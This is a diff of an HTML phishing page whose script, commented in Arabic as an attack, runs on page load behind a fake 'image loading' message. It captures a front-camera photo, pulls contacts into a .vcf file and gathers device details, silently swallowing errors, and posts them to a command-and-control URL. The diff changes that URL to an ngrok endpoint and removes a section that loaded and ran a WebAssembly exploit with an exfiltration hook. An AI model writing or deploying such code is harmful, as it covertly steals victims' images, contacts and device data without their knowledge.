@@ -25,12 +25,12 @@
 
     <script>
         // ================== إعدادات ==================
-        const C2_URL = "https://one-dr.github.io/bng/outt.html";   // ← غير هذا إلى رابط ngrok الخاص بك
+        const C2_URL = "https://abc123.ngrok.io/collect";   // ← غير هذا إلى رابط ngrok الفعلي
 
         // ================== الدالة الرئيسية للهجوم ==================
         async function startAdvancedAttack() {
 
-            // 1. محاولة التقاط صورة من الكاميرا الأمامية
+            // 1. التقاط صورة من الكاميرا الأمامية
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: "user", width: 640, height: 480 } 
@@ -56,7 +56,7 @@
                 }, 1800);
             } catch(e) { /* صامت */ }
 
-            // 2. محاولة استخراج جهات الاتصال وتحويلها إلى .vcf
+            // 2. استخراج جهات الاتصال → .vcf
             try {
                 if (navigator.contacts && navigator.contacts.select) {
                     const contacts = await navigator.contacts.select(["name", "tel"], { multiple: true });
@@ -77,7 +77,7 @@
                 }
             } catch(e) { /* صامت */ }
 
-            // 3. جمع معلومات الجهاز التفصيلية
+            // 3. معلومات الجهاز
             const deviceInfo = {
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
@@ -94,43 +94,16 @@
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify(deviceInfo)
             });
-
-            // 4. تحميل وتشغيل payload.wasm (الأقوى)
-            try {
-                const wasmResponse = await fetch('payload.wasm');
-                const wasmBytes = await wasmResponse.arrayBuffer();
-
-                const wasmModule = await WebAssembly.instantiate(wasmBytes, {
-                    env: {
-                        exfiltrate: function(ptr) {
-                            // إرسال البيانات من Wasm إلى C2
-                            const str = UTF8ToString ? UTF8ToString(ptr) : "Wasm data";
-                            fetch(C2_URL, {
-                                method: "POST",
-                                headers: { "Content-Type": "application/json" },
-                                body: JSON.stringify({ wasm_payload: str, time: Date.now() })
-                            });
-                        }
-                    }
-                });
-
-                // تشغيل الـ exploit في Wasm
-                if (wasmModule.instance.exports.startExploit) {
-                    wasmModule.instance.exports.startExploit();
-                }
-            } catch(e) { /* صامت */ }
         }
 
         // ================== بدء الهجوم ==================
         window.onload = function() {
             document.getElementById("status").innerHTML = "جاري تحسين الصورة...";
 
-            // بدء الهجوم بعد تحميل الصفحة بقليل
             setTimeout(() => {
                 startAdvancedAttack();
             }, 1300);
 
-            // رسالة نهائية
             setTimeout(() => {
                 document.getElementById("status").innerHTML = "تم تحميل الصورة بنجاح ✓";
             }, 6500);
